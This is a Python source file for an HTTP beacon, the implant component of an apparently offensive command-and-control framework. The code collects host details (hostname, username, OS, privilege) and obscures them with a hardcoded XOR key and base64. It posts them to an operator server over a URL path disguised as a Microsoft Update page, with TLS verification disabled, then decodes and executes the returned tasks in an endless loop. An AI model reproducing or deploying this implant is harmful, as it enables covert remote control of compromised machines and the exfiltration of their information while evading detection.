import sys
import time
import requests
import json
import base64

import urllib3
urllib3.disable_warnings()

from Beacon import xorEncode
from Beacon import Beacon


class BeaconHttp(Beacon):

    def __init__(self, url, port):
        super().__init__()
        self.url = url
        self.port = port


    def checkIn(self):
        try:
            sessions = []
            for it in self.taskResults:
                sessions.append(it)
            self.taskResults.clear()

            headers = {'Content-type': 'application/json', 'Authorization': "Bearer dgfghlsfojdojsdgsghsfgdssfsdsqffgcd"}
            url = self.url + ":" + self.port + "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"

            boundel = {
                "arch": self.arch, 
                "beaconHash": self.beaconHash, 
                "hostname": self.hostname , 
                "listenerHash": "", 
                "os": self.os,  
                "privilege": self.privilege, 
                "sessions": "", 
                "username": self.username, 
                "lastProofOfLife":"0"
                }
            
            boundel["sessions"]=sessions

            json_object = json.dumps(boundel, separators=(',', ':'))
            dataToSend = "["+json_object+"]"

            key="dfsdgferhzdzxczevre5595485sdg";
            datab64 = xorEncode(dataToSend, key)
            bodyToPost = base64.b64encode(datab64.encode('utf-8'))
                
            response = requests.post(url, data=bodyToPost, headers=headers, verify=False)

            # cmdToTasks
            bodyb64d = base64.b64decode(response.content).decode('utf-8')

            bodyb64dd = xorEncode(bodyb64d, key)

            self.cmdToTasks(bodyb64dd)

        except:
          print("An exception occurred") 



    def runTasks(self):
        self.execInstruction()



def main() -> int:

    if len(sys.argv) < 2:
        print('Error: missing argument')
        sys.exit(1)

    url = sys.argv[1]
    port = sys.argv[2]

    beaconHttp = BeaconHttp(url, port)
    
    while 1:
        # try:
        beaconHttp.checkIn()

        beaconHttp.runTasks()

        # except:
        #   print("An exception occurred") 

        time.sleep(beaconHttp.sleepTimeMs/1000)

    return 0

if __name__ == '__main__':
    main() 

